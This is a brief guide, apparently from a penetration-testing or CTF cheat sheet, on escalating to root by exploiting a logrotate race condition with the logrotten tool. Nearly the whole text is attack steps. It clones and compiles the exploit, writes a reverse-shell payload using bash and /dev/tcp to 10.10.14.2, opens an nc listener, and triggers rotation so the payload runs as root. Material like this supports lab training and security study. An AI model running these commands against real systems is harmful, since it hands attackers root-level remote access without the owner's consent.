## Logrotate Privilege Escalation

`logrotate` is a Linux utility that manages log file rotation to prevent disk space exhaustion. It runs as root via cron and processes configuration from `/etc/logrotate.conf` and `/etc/logrotate.d/`.

### Requirements

| Condition | Detail |
| --------- | ------ |
| Writable log file | At least one log file managed by logrotate must be writable |
| Privileged execution | logrotate must run as root (default in most distros) |
| Vulnerable version | 3.8.6, 3.11.0, 3.15.0, or 3.18.0 |

---

### 1. Clone and compile logrotten

[logrotten](https://github.com/whotwagner/logrotten) exploits a race condition during log file rotation. Compile on a system with a matching kernel, then transfer to the target — or compile directly if a compiler is available:

```shell
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

---

### 2. Create the payload

```shell
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

---

### 3. Check the logrotate configuration

The exploit variant depends on which rotation option is in use:

```shell
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

If the output shows `create`, use the default exploit. If `compress`, use the `-c` flag with logrotten.

---

### 4. Start a listener

```shell
nc -nlvp 9001
```

---

### 5. Trigger the exploit

```shell
./logrotten -p ./payload /tmp/tmp.log
```

Wait for logrotate to run via cron — when rotation triggers on the target log file, the payload executes as root.

> 💡 If logrotate isn't firing automatically during the exercise, check `/etc/cron.daily/logrotate` to confirm the schedule, or look for a way to manually trigger rotation on the writable log file.
